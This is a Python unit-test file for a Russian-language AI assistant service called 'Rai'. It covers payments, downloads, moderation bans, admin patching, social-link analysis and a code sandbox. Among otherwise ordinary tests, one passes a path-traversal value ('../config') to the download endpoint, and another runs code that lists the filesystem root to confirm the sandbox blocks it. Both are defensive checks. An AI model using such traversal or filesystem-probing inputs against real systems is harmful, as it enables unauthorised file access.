                self.assertFalse(admin("platega_save", id="x", secret="y")[1]["ok"])
                code, _, headers = post("pay.php", {"csrf": json.loads(get("limits.php"))["csrf"], "plan": "plus", "months": 12}, opener=raw)
                order2 = state["requests"][-1][2]["payload"]
                self.assertEqual(state["requests"][-1][2]["paymentDetails"]["amount"], round(249 * 12 * 0.75))
                self.assertEqual(admin("order_check", id=order2)[1]["order"]["status"], "pending")
                state["orders"]["tx-2"]["status"] = "CONFIRMED"
                self.assertEqual(admin("order_check", id=order2)[1]["order"]["status"], "paid")
                self.assertEqual(json.loads(get("limits.php"))["plan"], "plus")

                # приложение для компьютера: раздел «Скачать» на главной и download.php
                home = get("index.php")
                for word in ('id="download"', "Скачать для Windows", "download.php?os=mac-x64", "download.php?os=deb", "Последняя версия"):
                    self.assertIn(word, home)
                code, _, headers = post("download.php?os=win", opener=raw)  # файла на хостинге нет — релиз на GitHub
                self.assertEqual(headers["Location"], "https://github.com/rteaminfo1-source/rai/releases/latest/download/Rai-Setup.exe")
                os.makedirs(os.path.join(site, "app"), exist_ok=True)
                for name, body in (("Rai-Setup.exe", b"MZ" + b"0" * 3 * 1048576), ("Rai-mac-arm64.zip", b"PK"), ("latest.yml", b"version: 1.0.7\nfiles: []\n")):
                    with open(os.path.join(site, "app", name), "wb") as fh:
                        fh.write(body)
                self.assertEqual(post("download.php?os=win", opener=raw)[2]["Location"], "app/Rai-Setup.exe")
                self.assertEqual(post("download.php?os=mac", opener=raw)[2]["Location"], "app/Rai-mac-arm64.zip")  # нет .dmg — .zip
                self.assertEqual(post("download.php?os=../config", opener=raw)[2]["Location"], "./")
                home = get("index.php")
                self.assertIn("Версия 1.0.7", home)
                self.assertIn("3 МБ", home)
                stats = admin("stats")[1]
                self.assertEqual((stats["app_version"], stats["downloads"]), ("1.0.7", {"win": 2, "mac": 1}))

                # документы: правила, соглашение, политика — с сегодняшней датой
                import datetime
                d = datetime.date.today()
                months = ["января", "февраля", "марта", "апреля", "мая", "июня", "июля", "августа", "сентября", "октября", "ноября", "декабря"]
                today = f"{d.day} {months[d.month - 1]} {d.year} г."
                for path, title in (("rules.php", "Правила Rai"), ("terms.php", "Пользовательское соглашение"),
                                    ("privacy.php", "Политика конфиденциальности")):
                    page = get(path)
                    self.assertIn(title, page)
                    self.assertIn(today, page)
                self.assertIn("8-800-2000-122", get("rules.php"))  # человеку в беде — помощь, а не бан
                self.assertIn("terms.php", get("login.php?tab=register"))

                # нарушение правил → уведомление в админке → блокировка → Rai не отвечает и не пускает → разблокировка
                def report(category, text):
                    req = urllib.request.Request(url + "report.php", method="POST", headers={"Content-Type": "application/json"},
                                                 data=json.dumps({"category": category, "text": text, "chat": "c-1", "version": "pro"}).encode())
                    try:
                        r = web.open(req)
                        return r.status, json.loads(r.read())
                    except urllib.error.HTTPError as e:
                        return e.code, json.loads(e.read())
                self.assertEqual(report("что-то", "текст")[0], 400)
                self.assertEqual(report("мат", "плохое слово"), (200, {"ok": True, "banned": None}))
                self.assertEqual(admin("stats")[1]["violations_new"], 1)
                v = admin("violations")[1]
                self.assertEqual((v["total"], v["new"], v["by_category"]["мат"]), (1, 1, 1))
                item = v["items"][0]
                self.assertEqual((item["login"], item["category"], item["text"], item["count"], item["banned"]), ("anya", "мат", "плохое слово", 1, False))
                self.assertTrue(admin("violations_seen", ids=[item["id"]])[1]["ok"])
                self.assertEqual(admin("stats")[1]["violations_new"], 0)
                self.assertEqual(admin("violations", filter="new")[1]["items"], [])
                self.assertEqual(admin("ban", login="nobody")[0], 404)
                self.assertTrue(admin("ban", login="anya", days=7, reason="мат в чате")[1]["ok"])
                me = json.loads(get("me.php"))
                self.assertEqual(me["banned"]["reason"], "мат в чате")
                self.assertGreater(me["banned"]["until"], time.time() + 6 * 86400)
                self.assertEqual(post("limits.php", {}, {"X-CSRF-Token": me["csrf"]})[0], 403)   # нейросеть не отвечает
                self.assertTrue(admin("violations")[1]["items"][0]["banned"])
                post("auth.php", {"csrf": me["csrf"], "action": "logout"})
                csrf_token = json.loads(get("me.php"))["csrf"]
                code, _, headers = post("auth.php", {"csrf": csrf_token, "action": "login", "login": "anya", "password": "secret123"}, opener=raw)
                self.assertEqual((code, headers["Location"]), (302, "login.php?error=banned"))   # войти тоже нельзя
                self.assertIn("заблокирован", get("login.php?error=banned"))
                self.assertTrue(admin("unban", login="anya")[1]["ok"])
                csrf_token = json.loads(get("me.php"))["csrf"]
                post("auth.php", {"csrf": csrf_token, "action": "login", "login": "anya", "password": "secret123"})
                me = json.loads(get("me.php"))
                self.assertEqual((me["user"]["login"], me["banned"]), ("anya", None))
                # гостя блокируют по IP
                post("auth.php", {"csrf": me["csrf"], "action": "logout"})
                self.assertTrue(admin("ban", ip="127.0.0.1", days=0)[1]["ok"])
                self.assertEqual(json.loads(get("me.php"))["banned"], {"reason": "нарушение правил Rai", "until": 0})
                self.assertEqual(admin("ban", ip="not-an-ip")[0], 400)
                admin("unban", ip="127.0.0.1")
                self.assertIsNone(json.loads(get("me.php"))["banned"])
            finally:
                php.terminate()
                php.wait()
                platega.shutdown()

    def test_make_admin(self):
        """Вкладка «Rai: подписки» встраивается в admin.php основного сайта одним файлом, повторно — без изменений."""
        import make_admin
        sample = "\n".join([
            "<?php", "session_start();", "$ACTION_PERMS = [",
            '    "save_perms" => "perms.manage", "reset_perms" => "perms.manage",', "];",
            "$TABS = [", '    "directors" => ["Директора школ", "🏫", "directors.manage", "Работа"],', "];",
            "function can($p) { return true; } function tab_allowed($k) { return true; } function flash($t, $type = 'info') {}",
            "$tab = 'home'; $settings = []; $user = 'owner'; $kpis = []; $notif = []; $my_unpaid_fines = [];",
            "/* POST ДЛЯ ОСТАЛЬНОГО */",
            'if (can("projects.manage"))  $kpis[] = ["projects", "🧩", 0, "проектов", false];',
            'if ($my_unpaid_fines)                                 $notif[] = ["fines", "💸", 0, "штрафов"];',
            "?>", '<?php if ($tab === "home"): ?>home', '<?php elseif ($tab === "directors"): ?>dir', "<?php endif; ?>", ""])
        once = make_admin.patch(sample, key="a" * 64)
        self.assertEqual(make_admin.patch(once, key="a" * 64), once)
        for part in ("RAI: НАЧАЛО", "function rai_admin_render", '"rai_order_check" => "users.manage"', '"rai"       => ["Rai: подписки"',
                     'elseif ($tab === "rai"): rai_admin_render();', "rai_cached_stats()", "define('RAI_ADMIN_KEY', '" + "a" * 64 + "')",
                     '"rai_rules" => ["Rai: правила"', 'elseif ($tab === "rai_rules"): rai_rules_render();', '"rai_ban" => "users.manage"',
                     '$tab === "rai_rules") rai_rules_post();', '"нарушений правил в Rai"', "function rai_rules_render"):
            self.assertIn(part, once)
        self.assertNotIn("require_once __DIR__ . '/admin_rai.php'", once)  # отдельный файл не нужен
        with self.assertRaises(make_admin.PatchError):
            make_admin.patch("<?php echo 1;")
        if __import__("shutil").which("php"):
            with tempfile.NamedTemporaryFile("w", suffix=".php", delete=False, encoding="utf-8") as fh:
                fh.write(once)
            r = __import__("subprocess").run(["php", "-l", fh.name], capture_output=True, text=True)
            os.unlink(fh.name)
            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_social_links(self):
        """Ссылки на TikTok, YouTube, Telegram, Instagram и сайт: PHP достаёт цифры, Rai считает вовлечённость и даёт советы."""
        import http.server
        import socket
        import subprocess
        import threading
        import time
        import urllib.request
        from datetime import datetime, timezone
        import brain as brain_mod
        import social
        from tests.social_fixtures import PAGES
        base = os.path.dirname(os.path.abspath(__file__))

        class Pages(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                path = urllib.parse.unquote(self.path.split("?")[0].lstrip("/"))
                if path.startswith("vm.tiktok.com/"):  # короткая ссылка TikTok
                    self.send_response(302)
                    self.send_header("Location", f"http://127.0.0.1:{self.server.server_address[1]}/www.tiktok.com/@rai.team/video/7400000000000000001")
                    self.end_headers()
                    return
                body, ctype = PAGES.get(path, ("", ""))
                self.send_response(200 if body else 404)
                self.send_header("Content-Type", ctype or "text/plain")
                self.end_headers()
                self.wfile.write(body.encode())

            def log_message(self, *a):
                pass
        pages = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Pages)
        threading.Thread(target=pages.serve_forever, daemon=True).start()
        with tempfile.TemporaryDirectory() as site:
            for name in ("net.php", "social.php"):
                with open(os.path.join(base, "hosting", "rai", name), encoding="utf-8") as src, open(os.path.join(site, name), "w", encoding="utf-8") as dst:
                    dst.write(src.read())
            with socket.socket() as sk:
                sk.bind(("127.0.0.1", 0))
                port = sk.getsockname()[1]
            env = dict(os.environ, NET_TEST_LOCAL="1", NET_TEST_SOCIAL=f"http://127.0.0.1:{pages.server_address[1]}/")
            php = subprocess.Popen(["php", "-S", f"127.0.0.1:{port}", "-t", site], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                def get(url):
                    for _ in range(50):
                        try:
                            raw = urllib.request.urlopen(f"http://127.0.0.1:{port}/net.php?social=" + urllib.parse.quote(url, safe=""), timeout=10).read()
                            return json.loads(raw)
                        except urllib.error.URLError:
                            time.sleep(0.1)
                    raise AssertionError("PHP не ответил")
                now = datetime(2026, 10, 2, 12, 0, tzinfo=timezone.utc)
                video = get("https://vm.tiktok.com/ZMabc/")
                self.assertEqual((video["platform"], video["kind"]), ("tiktok", "video"))
                self.assertEqual(video["stats"]["views"], 1250000)
                self.assertEqual(video["author"]["followers"], 120000)
                text, att = social.report(video, now)
                self.assertIn("| Вовлечённость (ER) | **6,0 %** — хорошо |", text)
                self.assertIn("попало в рекомендации", text)
                self.assertEqual(att[0]["type"], "photo")
                profile = get("https://www.tiktok.com/@rai.studio")
                self.assertEqual((profile["kind"], profile["author"]["videos"]), ("profile", 200))
                self.assertIn("Пустое описание профиля", social.report(profile, now)[0])
                yt = get("https://youtu.be/dQw4w9WgXcQ")
                self.assertEqual((yt["stats"]["views"], yt["stats"]["likes"], yt["duration"]), (48210, 2950, 754))
                self.assertIn("{без серверов}", yt["title"])  # фигурные скобки в строках не ломают разбор
                self.assertEqual(get("https://www.youtube.com/@raiteam")["author"]["followers"], 1230000)
                tg = get("https://t.me/raichannel")
                self.assertEqual((tg["author"]["followers"], len(tg["posts"])), (12500, 4))
                tg_text = social.report(tg, now)[0]
                self.assertIn("**28 %** — хорошо", tg_text)
                self.assertIn("[5 600 просмотров](https://t.me/raichannel/103)", tg_text)
                self.assertEqual(get("https://t.me/raichannel/103")["stats"]["views"], 5600)
                insta = get("https://www.instagram.com/rai.team/")
                self.assertEqual((insta["author"]["followers"], insta["author"]["handle"]), (15200, "rai.team"))
                post = get("https://www.instagram.com/p/ABC123/")
                self.assertEqual((post["stats"]["likes"], post["stats"]["comments"]), (1204, 87))
                web = get("https://example.com/")
                self.assertEqual((web["seo"]["h1"], web["seo"]["images_no_alt"]), (["Rai"], 1))
                self.assertIn("Картинок без alt: 1", social.report(web, now)[0])
                # Rai: данные, которые страница получила от сайта, — сразу в отчёт
                b = brain_mod.Brain(learned_path=os.path.join(site, "learned.json"))
                r = b.answer(SUN, "проанализируй https://vm.tiktok.com/ZMabc/\n[[link-data]]\n" + json.dumps(video, ensure_ascii=False))
                self.assertEqual(r["intent"], "social")
                self.assertIn("Вовлечённость (ER)", r["answer"])
                r = b.answer(SUN, "https://t.me/raichannel\n[[link-data]]\n" + json.dumps({"error": "Сайт ответил 403"}))
                self.assertIn("Сайт ответил 403", r["answer"])
            finally:
                php.terminate()
                php.wait()
                pages.shutdown()
                pages.server_close()

    def test_link_routing(self):
        import social
        self.assertTrue(social.is_link_request("https://www.tiktok.com/@user/video/1"))
        self.assertTrue(social.is_link_request("что скажешь про vm.tiktok.com/ZMabc/"))
        self.assertTrue(social.is_link_request("https://example.com"))                       # просто ссылка — разбор сайта
        self.assertTrue(social.is_link_request("проанализируй сайт https://example.com"))
        self.assertFalse(social.is_link_request("я читал https://example.com/news вчера, было интересно"))
        self.assertFalse(social.is_link_request("привет"))
        with tempfile.TemporaryDirectory() as d:
            b = Brain(learned_path=os.path.join(d, "l.json"))
            # без посредника на хостинге честно говорим, где это работает
            r = b.answer(SUN, "https://www.tiktok.com/@user/video/1")
            self.assertEqual(r["intent"], "social")
            self.assertIn("rai.rteam.info", r["answer"])
            self.assertIn("версии с интернетом", b.answer(FAST, "https://t.me/channel")["answer"])
            # «сделай сайт как …» — это код, а не анализ
            self.assertNotEqual(b.answer(SUN, "сделай сайт как https://example.com")["intent"], "social")


class MindTest(unittest.TestCase):
    """Rai Разум: сам понимает вопрос, ищет в своей базе и в интернете, читает страницы, проверяет ответ."""

    ARTICLE = {"Небо": ["Небо — пространство над поверхностью Земли, видимое с её поверхности.", [
        ["Цвет неба", "Днём небо голубое из-за рассеяния солнечного света в атмосфере. Синий свет рассеивается молекулами "
                      "воздуха сильнее красного — это называют рэлеевским рассеянием. На закате свет проходит через толстый "
                      "слой воздуха, и небо становится красным."],
        ["В культуре", "Небо часто изображают на картинах и упоминают в стихах. Многие народы считали небо обителью богов."]]],
        "Интернет": ["Интернет — всемирная система объединённых компьютерных сетей для хранения и передачи информации.", [
            ["Как работает", "Данные передаются пакетами по протоколу TCP/IP. Каждое устройство получает IP-адрес. "
                             "Маршрутизаторы передают пакеты от сети к сети, пока они не дойдут до адресата."]]]}

    def setUp(self):
        import deep
        import encyclopedia
        self.deep, self.enc = deep, encyclopedia
        self.saved = (encyclopedia._data, encyclopedia._index, deep.DIR, deep.URL)
        encyclopedia.load(data=QuestionTest.DATA)
        self.tmp = tempfile.TemporaryDirectory()
        import gzip
        import zlib
        n = 3
        parts = [{} for _ in range(n)]
        for title, art in self.ARTICLE.items():
            parts[zlib.crc32(title.encode()) % n][title] = art
        for k, part in enumerate(parts):
            with gzip.open(os.path.join(self.tmp.name, f"{k:02d}.json.gz"), "wt", encoding="utf-8") as f:
                json.dump(part, f, ensure_ascii=False)
        with open(os.path.join(self.tmp.name, "manifest.json"), "w", encoding="utf-8") as f:
            json.dump({"n": n, "titles": sorted(self.ARTICLE), "count": 2}, f, ensure_ascii=False)
        deep.DIR, deep.URL = self.tmp.name, ""
        deep.load_manifest()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))
        net._cache.clear()

    def tearDown(self):
        import brain as brain_mod
        self.enc._data, self.enc._index, self.deep.DIR, self.deep.URL = self.saved
        self.deep._manifest = None
        self.deep._titles = {}
        brain_mod.PROFILE.pop("level", None)
        self.tmp.cleanup()

    def test_understands_questions(self):
        import mind
        cases = {"почему небо голубое": "why", "как работает интернет": "how", "как научиться программировать": "howto",
                 "когда началась война": "when", "где находится Эверест": "where", "сколько весит слон": "num",
                 "какие бывают облака": "list", "что такое небо": "what", "объясни подробно квантовую физику": "explain",
                 "стоит ли учить python": "advice", "подумай, почему вымерли динозавры": "why"}
        for q, kind in cases.items():
            self.assertEqual(mind.understand(q)["kind"], kind, q)
        p = mind.understand("подумай, почему вымерли динозавры")
        self.assertTrue(p["think"])
        self.assertEqual(p["depth"], 2)
        self.assertEqual(mind.understand("почему небо голубое")["topic"], "Небо")
        self.assertEqual(mind.understand("почему небо голубое")["aspect"], ["голубое"])
        self.assertFalse(mind.wants("привет"))
        self.assertIsNone(mind.understand("сколько весит слон")["topic"])     # не город Слоним

    def test_offline_from_deep_knowledge(self):
        import mind
        r = mind.think("почему небо голубое", web=False, level="low")
        self.assertIsNotNone(r)
        self.assertIn("**Коротко:** Днём небо голубое из-за рассеяния", r["text"])
        self.assertIn("ru.wikipedia.org", r["text"])
        self.assertIn("Rai Разум · Low", r["text"])
        kinds = [s["kind"] for s in r["trace"]]
        self.assertEqual(kinds[0], "think")
        self.assertIn("check", kinds)
        self.assertGreaterEqual(r["confidence"], 0.55)
        # нет причины в текстах — не выдумывает
        self.assertIsNone(mind.think("почему пушкино", web=False))

    def test_brain_uses_mind_with_levels(self):
        import brain as brain_mod
        r = self.brain.answer(SUN, "почему небо голубое", session_id="m", level="low")
        self.assertEqual(r["intent"], "mind")                      # в глубоких знаниях статья целиком — Rai Разум
        self.assertEqual(r["attachments"][0]["type"], "trace")
        self.assertEqual(r["attachments"][0]["title"], "Как Rai думал")
        r = self.brain.answer(SUN, "объясни подробно как работает интернет", session_id="m", level="low")
        self.assertEqual(r["intent"], "mind")
        self.assertIn("пакетами", r["answer"])
        # без глубоких знаний — короткий ответ энциклопедии, как раньше
        self.deep._manifest = None
        self.assertEqual(self.brain.answer(SUN, "как работает интернет", session_id="m")["intent"], "encyclopedia")
        brain_mod.PROFILE["level"] = "code"            # уровень из страницы (профиль)
        r = self.brain.answer(PLUS, "посчитай сумму чётных чисел от 1 до 100", session_id="m")
        self.assertEqual(r["intent"], "code")
        self.assertIn("`2550`", r["answer"])

    def test_slides_from_deep_knowledge(self):
        # Low: без интернета — презентация из статьи целиком в глубоких знаниях
        before = len(fake_net.calls)
        r = self.brain.answer(SUN, "сделай презентацию про небо", session_id="m", level="low")
        deck = next(a for a in r["attachments"] if a["type"] == "slides")
        text = json.dumps(deck, ensure_ascii=False)
        self.assertIn("рассеяни", text)
        self.assertIn("знаний Rai", r["answer"])
        self.assertEqual(fake_net.calls[before:], [])                 # в интернет не ходил

    def test_web_research_reads_pages(self):
        import mind
        net.PROXY = "https://rai.test/net.php"
        try:
            r = mind.think("почему трава зелёная", web=True, level="high")
        finally:
            net.PROXY = ""
        self.assertIsNotNone(r)
        self.assertIn("хлорофилл", r["text"].lower())
        self.assertIn("(https://example.ru/grass)", r["text"])
        self.assertNotIn("скидк", r["text"])                     # мусор со страницы отброшен
        self.assertIn("open", [s["kind"] for s in r["trace"]])
        self.assertTrue(any("net.php?read=" in c for c in fake_net.calls))
        # Low не ходит в интернет
        before = len(fake_net.calls)
        mind.think("почему трава зелёная", web=True, level="low")
        self.assertEqual(len(fake_net.calls), before)

    def test_meaning_model(self):
        import sense
        words = ["планет", "орбит", "звезд", "борщ", "свекл", "суп"]
        import base64
        vec = [[100, 20, 0], [90, 30, 0], [80, 10, 10], [0, 10, 100], [5, 0, 95], [0, 20, 90]]
        raw = bytes(v & 0xFF for row in vec for v in row)
        saved = (sense._dim, sense._words, sense._index, sense._vecs, sense._related)
        try:
            self.assertEqual(sense.load({"dim": 3, "words": words, "vectors": base64.b64encode(raw).decode(), "related": {"0": [1, 2]}}), 6)
            self.assertGreater(sense.similarity("планета на орбите", "звезды"), sense.similarity("планета на орбите", "борщ из свеклы"))
            self.assertEqual(sense.related("планета"), ["орбит", "звезд"])
        finally:
            sense._dim, sense._words, sense._index, sense._vecs, sense._related = saved


class CodeMindTest(unittest.TestCase):
    """Rai пишет программы сам: разбирает задачу, собирает код и проверяет его запуском."""

    def test_compositional_programs(self):
        import codemind
        cases = {
            "напиши программу которая выводит сумму чётных чисел от 1 до 100": "2550",
            "посчитай сумму квадратов нечётных чисел от 1 до 10": "165",
            "найди второе по величине число в списке [4, 9, 2, 9, 7]": "7",
            "первые 10 простых чисел": "2 3 5 7 11 13 17 19 23 29",
        }
        for task, out in cases.items():
            r = codemind.generate(task)
            self.assertTrue(r and r["ok"], task)
            self.assertIn(f"`{out}`", r["about"], task)
            self.assertIn("def ", r["code"] if "первые" not in task else "def _is_prime")
        r = codemind.generate("пользователь вводит список чисел, выведи сумму положительных")
        self.assertTrue(r["ok"])
        self.assertIn("input(", r["code"])
        out, err = codemind.run(r["code"], ["3 -8 14"])
        self.assertEqual((out.strip(), err), ("17", None))

    def test_user_example_and_alternatives(self):
        import codemind
        r = codemind.generate("напиши программу: вводится число, найти его факториал. например для 5 ответ 120")
        self.assertTrue(r["ok"])
        self.assertIn("✅ ваш пример 5 → `120`", r["about"])
        r = codemind.generate("программа: дано число, вывести количество цифр, например 777 → 4")
        self.assertFalse(r["ok"])                                     # пример неверный — Rai честно об этом говорит
        self.assertIn("не сходится ни с одним", r["about"])

    def test_sandbox(self):
        import codemind
        out, err = codemind.run("while True:\n    pass\n", max_steps=5000)
        self.assertIn("бесконечный цикл", err)
        out, err = codemind.run("import os\nprint(os.listdir('/'))")
        self.assertIn("ImportError", err)
        out, err = codemind.run("print(input())", ["привет"])
        self.assertEqual(out.strip(), "привет")

    def test_javascript_and_routing(self):
        import codemind
        r = codemind.generate("напиши на javascript программу: сумма чётных чисел от 1 до 100", "javascript")
        self.assertEqual(r["lang"], "javascript")
        self.assertIn("filter((x) => x % 2 === 0)", r["code"])
        with tempfile.TemporaryDirectory() as d:
            b = Brain(learned_path=os.path.join(d, "l.json"))
            r = b.answer(PLUS, "напиши программу: пользователь вводит список чисел, найди среднее положительных")
            self.assertEqual(r["intent"], "code")
            self.assertIn("проверил запуском", r["answer"])
            self.assertEqual(r["attachments"][0]["type"], "code")
            self.assertIn("Калькулятор", b.answer(PLUS, "напиши калькулятор на python")["answer"])   # готовые программы остались


class DeepBuildTest(unittest.TestCase):
    """Сборщик глубоких знаний (GitHub): разделы статей, части меньше 30 МБ, модель смыслов, выкладка на хостинг."""

    def test_split_parts_and_hosting(self):
        import sys
        import gzip
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools"))
        import build_deep
        import deep
        import make_hosting
        text = ("Марс — четвёртая планета.\n\n== История изучения ==\n" + "Марс изучают давно. " * 10 +
                "\n\n== Примечания ==\nСсылка. " + "x " * 100 + "\n\n=== Подраздел примечаний ===\nещё ссылки " * 5)
        lead, sections = build_deep.split_article(text)
        self.assertEqual(lead, "Марс — четвёртая планета.")
        self.assertEqual([h for h, _ in sections], ["История изучения"])
        with tempfile.TemporaryDirectory() as d:
            arts = {f"Тема {i}": [f"Тема {i} — это тема номер {i}.", [["Раздел", "Текст раздела. " * 20]]] for i in range(300)}
            m = build_deep.write_parts(arts, d)
            self.assertEqual(m["count"], 300)
            saved = (deep.DIR, deep.URL, deep._manifest, dict(deep._titles))
            try:
                deep.DIR, deep.URL = d, ""
                deep.load_manifest()
                self.assertEqual(deep.part_of("Тема 7"), build_deep.zlib.crc32("Тема 7".encode()) % m["n"])
                self.assertEqual(deep.article("тема 7")["lead"], "Тема 7 — это тема номер 7.")
            finally:
                deep.DIR, deep.URL, deep._manifest, deep._titles = saved
            with open(os.path.join(d, "sense.json.gz"), "wb") as f:
                f.write(gzip.compress(b'{"dim": 1, "words": ["a"], "vectors": "AQ=="}'))
            with tempfile.TemporaryDirectory() as out:
                import shutil
                shutil.copytree(d, os.path.join(out, "repo", "deep"))
                with mock.patch.object(make_hosting, "BASE", os.path.join(out, "repo")):
                    n = make_hosting.write_deep(os.path.join(out, "site", "deep"))
                self.assertEqual(n, m["n"])
                for name in os.listdir(os.path.join(out, "site", "deep")):
                    path = os.path.join(out, "site", "deep", name)
                    self.assertTrue(name.endswith(".php"))
                    self.assertLess(os.path.getsize(path), 30 * 1024 * 1024)
                back = json.loads(make_hosting.read_kb(os.path.join(out, "site", "deep", "manifest.php")))
                self.assertEqual(back["count"], 300)
                part = json.loads(make_hosting.read_kb(os.path.join(out, "site", "deep", "00.php")))
                self.assertTrue(all(t.startswith("Тема") for t in part))

    @unittest.skipUnless(__import__("importlib").util.find_spec("numpy") and __import__("importlib").util.find_spec("scipy"), "нет numpy/scipy")
    def test_train_sense(self):
        import sys
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools"))
        import build_deep
        import sense
        paras = []
        for _ in range(40):
            paras += [nlp.tokens("планета вращается по орбите вокруг звезды солнце"), nlp.tokens("звезда солнце светит планете на орбите"),
                      nlp.tokens("борщ варят из свеклы капусты и мяса суп"), nlp.tokens("суп борщ с капустой и свеклой вкусный обед")]
        model = build_deep.train_sense(paras, vocab_size=100, dim=4, min_count=2)
        saved = (sense._dim, sense._words, sense._index, sense._vecs, sense._related)
        try:
            sense.load(model)
            self.assertGreater(sense.similarity("планета", "звезды солнце"), sense.similarity("планета", "борщ с капустой"))
        finally:
            sense._dim, sense._words, sense._index, sense._vecs, sense._related = saved


if __name__ == "__main__":
    unittest.main()
